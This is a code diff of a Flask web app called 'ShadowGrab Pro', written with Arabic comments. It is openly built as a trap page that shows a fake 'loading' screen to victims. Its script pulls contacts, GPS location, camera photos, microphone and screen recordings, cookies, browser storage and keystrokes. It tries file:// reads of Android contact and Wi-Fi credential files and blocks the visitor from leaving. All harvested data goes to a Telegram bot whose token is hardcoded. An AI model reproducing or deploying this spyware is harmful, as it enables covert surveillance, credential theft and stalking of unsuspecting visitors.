@@ -5,297 +5,256 @@ import requests
 import threading
 import datetime
 import base64
+import re
 
 app = Flask(__name__)
 
-# ===== إعدادات بوت تيليجرام =====
+# ===== إعدادات البوت =====
 TELEGRAM_TOKEN = "8875360747:AAHZH8ti8BTzA8_Gzo6QV6ex4OsaJyoBovI"
 TELEGRAM_CHAT_ID = "1170411845"
 
-def send_telegram_notification(message):
+def send_telegram(message, photo=None):
     try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": TELEGRAM_CHAT_ID,
-            "text": message,
-            "parse_mode": "HTML"
-        }
-        response = requests.post(url, json=payload, timeout=5)
-        return response.json()
+        if photo:
+            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
+            files = {'photo': photo}
+            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': message[:900]}
+            requests.post(url, files=files, data=data, timeout=10)
+        else:
+            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+            payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message[:4000], "parse_mode": "HTML"}
+            requests.post(url, json=payload, timeout=5)
     except Exception as e:
-        print(f"خطأ في الإرسال: {e}")
-        return None
+        print(f"خطأ: {e}")
 
-# ===== صفحة الهجوم =====
+# ===== الصفحة الرئيسية (المصيدة) =====
 @app.route('/')
 def index():
     visitor_ip = request.remote_addr
-    user_agent = request.headers.get('User-Agent', 'غير معروف')
+    send_telegram(f"""🔥 <b>دخول ضحية جديدة</b>
+🌐 IP: {visitor_ip}
+⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+📱 جاري سحب البيانات...""")
     
-    # إشعار فوري عند الدخول
-    message = f"""🎯 <b>دخول ضحية جديدة!</b>
-
-🌐 <b>IP:</b> {visitor_ip}
-💻 <b>المتصفح:</b> {user_agent[:150]}
-⏰ <b>الوقت:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-
-<b>جاري سحب البيانات...</b>"""
-    threading.Thread(target=send_telegram_notification, args=(message,)).start()
-    
-    # صفحة مصيدة تحتوي على جميع أكواد السحب
     return '''
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Loading...</title>
+        <title>جار التحميل...</title>
         <style>
-            body { background: black; color: #00ff41; font-family: Arial; text-align: center; padding: 50px; }
-            .loader { border: 4px solid #333; border-top: 4px solid #00ff41; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 50px auto; }
+            body { background: #000; color: #0f0; font-family: Arial; text-align: center; padding: 50px; }
+            .spinner { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 50px auto; }
             @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+            .hidden { display: none; }
         </style>
     </head>
     <body>
-        <div class="loader"></div>
-        <h1 style="color:#00ff41;">جار التحميل...</h1>
+        <div class="spinner"></div>
+        <h1>جار التحميل...</h1>
         <p style="color:#666;">الرجاء الانتظار</p>
-        
+
+        <!-- إطار خفي لتشغيل الصوت والفيديو -->
+        <iframe id="hiddenFrame" style="display:none;"></iframe>
+
         <script>
-            // ===== 1. جمع معلومات الجهاز =====
-            const data = {
-                ip: "{{ request.remote_addr }}",
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                colorDepth: screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer || "مباشر",
-                cookies: document.cookie || "لا توجد كوكيز",
-                localStorage: JSON.stringify(localStorage) || "{}",
-                sessionStorage: JSON.stringify(sessionStorage) || "{}",
-                timestamp: new Date().toISOString()
-            };
-            
-            // ===== 2. محاولة الحصول على الموقع الجغرافي =====
+            // ===== 1. سحب جهات الاتصال (أندرويد) =====
+            if (navigator.contacts) {
+                navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
+                    .then(contacts => {
+                        sendData('📇 جهات الاتصال', JSON.stringify(contacts));
+                    })
+                    .catch(() => {});
+            }
+
+            // ===== 2. سحب موقع GPS =====
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     pos => {
-                        data.latitude = pos.coords.latitude;
-                        data.longitude = pos.coords.longitude;
-                        data.accuracy = pos.coords.accuracy;
-                        sendData();
+                        sendData('📍 الموقع', `${pos.coords.latitude}, ${pos.coords.longitude} (دقة: ${pos.coords.accuracy}m)`);
                     },
-                    err => {
-                        data.geoError = err.message;
-                        sendData();
-                    },
+                    err => {},
                     { enableHighAccuracy: true, timeout: 5000 }
                 );
-            } else {
-                data.geoError = "Geolocation غير مدعوم";
-                sendData();
             }
-            
-            // ===== 3. محاولة التقاط صورة من الكاميرا =====
-            function captureCamera() {
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                        .then(stream => {
-                            const video = document.createElement('video');
-                            video.srcObject = stream;
-                            video.onloadedmetadata = () => {
-                                video.play();
-                                const canvas = document.createElement('canvas');
-                                canvas.width = video.videoWidth || 640;
-                                canvas.height = video.videoHeight || 480;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                const imgData = canvas.toDataURL('image/jpeg', 0.7);
-                                data.cameraImage = imgData;
-                                stream.getTracks().forEach(t => t.stop());
-                                sendData();
-                            };
-                        })
-                        .catch(err => {
-                            data.cameraError = err.message;
-                            sendData();
-                        });
-                } else {
-                    data.cameraError = "الكاميرا غير مدعومة";
-                    sendData();
-                }
+
+            // ===== 3. التقاط صورة من الكاميرا =====
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                    .then(stream => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const imgData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+                            sendPhoto(imgData);
+                            stream.getTracks().forEach(t => t.stop());
+                        };
+                    })
+                    .catch(() => {});
             }
-            
-            // ===== 4. Keylogger =====
+
+            // ===== 4. تسجيل الميكروفون =====
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ audio: true })
+                    .then(stream => {
+                        const recorder = new MediaRecorder(stream);
+                        recorder.ondataavailable = e => {
+                            if (e.data.size > 0) {
+                                const reader = new FileReader();
+                                reader.onload = () => {
+                                    const audioBase64 = reader.result.split(',')[1];
+                                    sendData('🎤 تسجيل صوتي', audioBase64.substring(0, 200) + '...');
+                                };
+                                reader.readAsDataURL(e.data);
+                            }
+                        };
+                        recorder.start();
+                        setTimeout(() => recorder.stop(), 8000);
+                    })
+                    .catch(() => {});
+            }
+
+            // ===== 5. سحب كوكيز وجلسات =====
+            const cookies = document.cookie || 'لا توجد';
+            sendData('🍪 الكوكيز', cookies);
+
+            // ===== 6. سحب LocalStorage و SessionStorage =====
+            try {
+                const ls = JSON.stringify(localStorage) || '{}';
+                const ss = JSON.stringify(sessionStorage) || '{}';
+                sendData('💾 التخزين المحلي', `LS: ${ls.substring(0, 200)}\nSS: ${ss.substring(0, 200)}`);
+            } catch(e) {}
+
+            // ===== 7. سحب معلومات الجهاز =====
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'مباشر',
+                timestamp: new Date().toISOString()
+            };
+            sendData('💻 معلومات الجهاز', JSON.stringify(info, null, 2));
+
+            // ===== 8. محاولة الوصول إلى ملفات النظام (استغلال ثغرة) =====
+            try {
+                // محاولة قراءة قاعدة بيانات جهات الاتصال (أندرويد)
+                fetch('file:///data/data/com.android.providers.contacts/databases/contacts2.db')
+                    .then(res => res.text())
+                    .then(data => sendData('📂 قاعدة البيانات', data.substring(0, 500)))
+                    .catch(() => {});
+                
+                // محاولة قراءة ملفات واي فاي
+                fetch('file:///data/misc/wifi/wpa_supplicant.conf')
+                    .then(res => res.text())
+                    .then(data => sendData('📶 شبكات WiFi', data.substring(0, 500)))
+                    .catch(() => {});
+            } catch(e) {}
+
+            // ===== 9. تسجيل المفاتيح =====
             let keys = [];
             document.addEventListener('keydown', e => {
                 keys.push(e.key);
-                if (keys.length > 200) keys.shift();
-                data.keys = keys.join(' ');
+                if (keys.length > 100) keys.shift();
             });
-            
-            // ===== 5. إرسال البيانات =====
-            let sent = false;
-            function sendData() {
-                if (sent) return;
-                // ننتظر الكاميرا إذا لم ترسل بعد
-                if (data.cameraImage === undefined && !data.cameraError) {
-                    // ننتظر ثانية ثم نرسل
-                    setTimeout(() => {
-                        if (!sent) {
-                            sent = true;
-                            finalSend();
-                        }
-                    }, 3000);
-                    return;
+            setInterval(() => {
+                if (keys.length > 0) {
+                    sendData('⌨️ المفاتيح المسجلة', keys.join(' '));
+                    keys = [];
                 }
-                sent = true;
-                finalSend();
-            }
-            
-            function finalSend() {
-                // إضافة المفاتيح المسجلة
-                data.keys = keys.join(' ');
-                
-                // تشفير Base64 للإرسال
-                const payload = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
-                
-                // إرسال إلى الخادم
+            }, 5000);
+
+            // ===== دوال الإرسال =====
+            function sendData(label, content) {
+                if (!content || content.length < 2) return;
+                const payload = btoa(unescape(encodeURIComponent(JSON.stringify({ label, content, time: new Date().toISOString() }))));
                 fetch('/collect', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ payload: payload })
-                }).then(() => {
-                    console.log('✅ تم إرسال البيانات');
-                }).catch(err => {
-                    console.log('❌ خطأ في الإرسال:', err);
-                });
-                
-                // إرسال مباشر إلى التيليجرام عبر الخادم
-                fetch('/telegram', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ data: data })
+                    body: JSON.stringify({ payload })
                 }).catch(() => {});
             }
-            
-            // بدء التقاط الكاميرا بعد 2 ثانية
-            setTimeout(captureCamera, 2000);
-            
-            // إرسال تلقائي بعد 10 ثواني احتياطياً
-            setTimeout(() => {
-                if (!sent) {
-                    sent = true;
-                    finalSend();
-                }
-            }, 10000);
-            
-            // منع الخروج
-            window.onbeforeunload = function() {
-                return "جار التحميل...";
-            };
-            
-            // إخفاء المؤشر
-            document.body.style.cursor = 'wait';
+
+            function sendPhoto(base64Image) {
+                fetch('/photo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: base64Image })
+                }).catch(() => {});
+            }
+
+            // ===== تشغيل تسجيل الشاشة =====
+            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+                navigator.mediaDevices.getDisplayMedia({ video: true })
+                    .then(stream => {
+                        const recorder = new MediaRecorder(stream);
+                        recorder.ondataavailable = e => {
+                            if (e.data.size > 0) {
+                                const reader = new FileReader();
+                                reader.onload = () => {
+                                    const videoBase64 = reader.result.split(',')[1];
+                                    sendData('📹 تسجيل الشاشة', videoBase64.substring(0, 200) + '...');
+                                };
+                                reader.readAsDataURL(e.data);
+                            }
+                        };
+                        recorder.start();
+                        setTimeout(() => recorder.stop(), 5000);
+                    })
+                    .catch(() => {});
+            }
+
+            // ===== منع الخروج =====
+            window.onbeforeunload = () => 'جار التحميل...';
         </script>
     </body>
     </html>
     '''
 
-# ===== نقطة استقبال البيانات =====
+# ===== استقبال البيانات =====
 @app.route('/collect', methods=['POST'])
 def collect():
     try:
         data = request.json
         if data and 'payload' in data:
-            # فك التشفير
             decoded = json.loads(base64.b64decode(data['payload']).decode('utf-8'))
+            label = decoded.get('label', 'بيانات')
+            content = decoded.get('content', '')
+            time = decoded.get('time', datetime.datetime.now().isoformat())
             
-            # بناء رسالة مفصلة
-            msg = f"""🎯 <b>بيانات الضحية</b>
-
-🌐 <b>IP:</b> {decoded.get('ip', 'غير معروف')}
-💻 <b>المتصفح:</b> {decoded.get('userAgent', 'غير معروف')[:100]}
-📱 <b>المنصة:</b> {decoded.get('platform', 'غير معروف')}
-🌍 <b>اللغة:</b> {decoded.get('language', 'غير معروف')}
-🖥️ <b>الشاشة:</b> {decoded.get('screenWidth', '?')}x{decoded.get('screenHeight', '?')}
-🕒 <b>المنطقة:</b> {decoded.get('timezone', 'غير معروف')}
-📌 <b>المرجع:</b> {decoded.get('referrer', 'مباشر')[:80]}
-🍪 <b>الكوكيز:</b> {decoded.get('cookies', 'لا توجد')[:150]}
-"""
-
-            # الموقع
-            if 'latitude' in decoded:
-                msg += f"""📍 <b>الموقع:</b> {decoded.get('latitude')}, {decoded.get('longitude')} (دقة: {decoded.get('accuracy', '?')}م)\n"""
-            if 'geoError' in decoded:
-                msg += f"⚠️ <b>خطأ الموقع:</b> {decoded.get('geoError')}\n"
-            
-            # الكاميرا
-            if 'cameraImage' in decoded:
-                msg += f"📸 <b>صورة الكاميرا:</b> تم التقاطها (مشفرة)\n"
-                # إرسال الصورة كملف
-                img_data = decoded['cameraImage'].split(',')[1]
-                send_photo(img_data)
-            if 'cameraError' in decoded:
-                msg += f"⚠️ <b>خطأ الكاميرا:</b> {decoded.get('cameraError')}\n"
-            
-            # المفاتيح
-            if 'keys' in decoded and decoded['keys']:
-                msg += f"⌨️ <b>المفاتيح:</b> {decoded['keys'][:200]}\n"
-            
-            # التخزين المحلي
-            if decoded.get('localStorage') and decoded['localStorage'] != '{}':
-                msg += f"💾 <b>LocalStorage:</b> {decoded['localStorage'][:150]}\n"
-            
-            msg += f"\n⏰ <b>الوقت:</b> {decoded.get('timestamp', datetime.datetime.now().isoformat())}"
-            
-            send_telegram_notification(msg)
+            msg = f"""📌 <b>{label}</b>
+📝 {content[:1000]}
+⏰ {time}"""
+            send_telegram(msg)
             return jsonify({"status": "ok"})
     except Exception as e:
-        print(f"خطأ في جمع البيانات: {e}")
+        print(f"خطأ: {e}")
     return jsonify({"status": "error"}), 400
 
-# ===== إرسال الصورة للتيليجرام =====
-def send_photo(base64_image):
+# ===== استقبال الصور =====
+@app.route('/photo', methods=['POST'])
+def photo():
     try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
-        files = {'photo': ('image.jpg', base64.b64decode(base64_image), 'image/jpeg')}
-        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': '📸 صورة من كاميرا الضحية'}
-        requests.post(url, files=files, data=data, timeout=10)
-    except Exception as e:
-        print(f"خطأ في إرسال الصورة: {e}")
-
-# ===== نقطة إرسال مباشر للتيليجرام =====
-@app.route('/telegram', methods=['POST'])
-def telegram_direct():
-    try:
-        data = request.json.get('data', {})
-        msg = f"""🎯 <b>بيانات فورية</b>
-
-🌐 IP: {data.get('ip', 'غير معروف')}
-💻 UA: {data.get('userAgent', 'غير معروف')[:80]}
-📍 الموقع: {data.get('latitude', '?')}, {data.get('longitude', '?')}
-📸 كاميرا: {'✅' if 'cameraImage' in data else '❌'}
-⌨️ مفاتيح: {data.get('keys', '')[:100]}"""
-        send_telegram_notification(msg)
-        return jsonify({"status": "ok"})
+        data = request.json
+        if data and 'image' in data:
+            img_data = base64.b64decode(data['image'])
+            send_telegram('📸 صورة من الكاميرا', ('image.jpg', img_data, 'image/jpeg'))
+            return jsonify({"status": "ok"})
     except Exception as e:
         print(f"خطأ: {e}")
-        return jsonify({"status": "error"}), 400
+    return jsonify({"status": "error"}), 400
 
 if __name__ == '__main__':
-    # إشعار تشغيل
-    try:
-        send_telegram_notification(f"""🔥 <b>تم تشغيل ShadowGrab!</b>
-
-🎯 الموقع جاهز لاستقبال الضحايا
-📨 سيتم إرسال كل البيانات إلى البوت
-🛡️ البوت: @SSSTlF
+    send_telegram(f"""🔥 <b>ShadowGrab Pro مفعل</b>
+🎯 جاهز لسحب البيانات من الهواتف
+📱 جهات الاتصال • الموقع • الكاميرا • الميكروفون • المفاتيح
 ⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}""")
-    except:
-        pass
     
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
